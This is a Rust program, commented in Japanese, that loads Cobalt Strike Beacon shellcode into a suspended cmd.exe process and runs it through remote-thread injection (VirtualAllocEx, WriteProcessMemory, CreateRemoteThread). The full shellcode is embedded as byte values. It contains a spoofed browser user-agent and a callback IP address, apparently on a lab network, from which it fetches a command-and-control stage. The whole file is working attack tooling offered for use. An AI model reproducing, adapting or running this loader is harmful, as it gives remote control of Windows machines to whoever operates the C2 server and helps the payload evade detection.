/* CobaltStrike の Beacon シェルコードを実行するプログラム
 * 
 * CobaltStrike の [Payloads] ⇒ [MS Office Macro] からシェルコードを抽出して、textに貼り付け
 * Programは32bitで動作 ⇒ [MS Office Macro] から生成されるシェルコードは32bitのため
*/

use std::ptr::{null_mut, null};
use std::ffi::CString;
use std::mem::{zeroed};
use std::mem::transmute;

use winapi::ctypes::{c_void};
use winapi::um::processthreadsapi::CreateRemoteThread;
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::shared::ntdef::PSTR;
use winapi::um::memoryapi::{VirtualAllocEx,WriteProcessMemory};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE};

use winapi::shared::minwindef::{LPCVOID};

fn print_typename<T>(_: T) {
    println!("{}", std::any::type_name::<T>());
}

fn main() {
    
    unsafe {
        // ここにCobaltStrikeのシェルコードを格納する。
        //
        let text = "-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, 13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, -42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, -117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, -43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, -58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, 104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, -43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, -1,-1,47,53,116,101,78,0,-85,40,114,-114,109,125,-82,21,2,22,27,77,64,-49,99,-72,-45,52,-75,71,-57,-2,-101,-69,-114,-22,5,-68,-15,-92,-123,-78, 40,-58,-20,93,-4,-7,-114,107,-37,-9,-54,-55,-21,-128,-8,51,114,-68,-12,-102,-104,3,123,-5,5,-117,11,-90,-16,111,-5,63,-105,-50,13,86,93,113,10,-39, 21,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, 83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,48,59,32,87,79,87,54,52,59,32,84,114,105,100,101,110,116,47, 53,46,48,59,32,109,115,110,32,79,112,116,105,109,105,122,101,100,73,69,56,59,69,78,85,83,41,13,10,0,57,72,-49,-78,-17,-120,-24,73,43,-67, 50,19,75,47,-119,37,70,-73,-13,-74,43,3,37,67,0,-88,-39,86,-77,-42,-93,-52,106,-88,-82,76,71,-99,34,81,121,106,-47,8,-122,-67,-30,-103,-21,-124, -113,-2,-86,31,-2,-45,27,78,-28,-121,82,54,105,-111,63,6,-99,-104,-31,71,108,27,16,-90,-37,-109,-8,-89,120,-82,-113,73,62,106,-30,-85,-19,108,-104,120, 74,-47,-26,89,-128,26,78,47,-3,114,-40,-60,118,-118,85,-62,106,31,44,-36,-57,28,70,47,11,7,116,26,-21,20,-101,30,-42,5,-108,68,86,91,-7,-84, -56,80,-120,-94,51,-96,-123,-70,-116,25,36,14,-64,67,8,32,119,6,77,-15,-85,56,45,82,98,80,-75,54,90,89,21,124,-109,-30,49,34,-29,83,13,-72, -111,75,111,-93,-91,-104,-52,74,70,28,106,-56,50,-73,-94,116,47,-4,-108,21,-79,-21,-107,41,-87,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, 104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, -123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,49,49,55,46,49,50,57,0,99,-44,93,-31";
        // スプリットして文字列の配列にする

        let numbers: Vec<&str> = text.split(',').collect();

        // 文字列の配列からi16型のベクタに変換する
        let mut buf: Vec<i16> = Vec::new();
        for number in numbers {
            if let Ok(parsed) = number.trim().parse::<i16>() {
                buf.push(parsed);
            } else {
                println!("Failed to parse {}", number);
            }
        }
        println!("{:?}", buf);


        let target = CString::new("C:\\Windows\\SysWOW64\\cmd.exe").expect("CString::new failed");
        let mut startup_info: STARTUPINFOA = zeroed();
        let mut process_info: PROCESS_INFORMATION = zeroed();

        //引数が１なら成功
        let process = CreateProcessA(
            null(),
            target.as_ptr() as PSTR,
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut process_info,
        );  
        println!("Bytes: {:?}", process);

        let address = VirtualAllocEx(
            process_info.hProcess,
            null_mut(),
            buf.len(),
            MEM_COMMIT | MEM_RESERVE,
             PAGE_EXECUTE
        );

        print_typename(address);
        
        for i in 0..buf.len() {

            let addr = (address as *mut i8).offset(i as isize) as *mut c_void;

            let byte = buf[i] as u8;
            WriteProcessMemory(process_info.hProcess, addr, &byte as *const u8 as LPCVOID, 1, null_mut());
        }

        let func = transmute(address);
        CreateRemoteThread(process_info.hProcess,null_mut(), 0, func, null_mut(),0, null_mut());
    }   
}

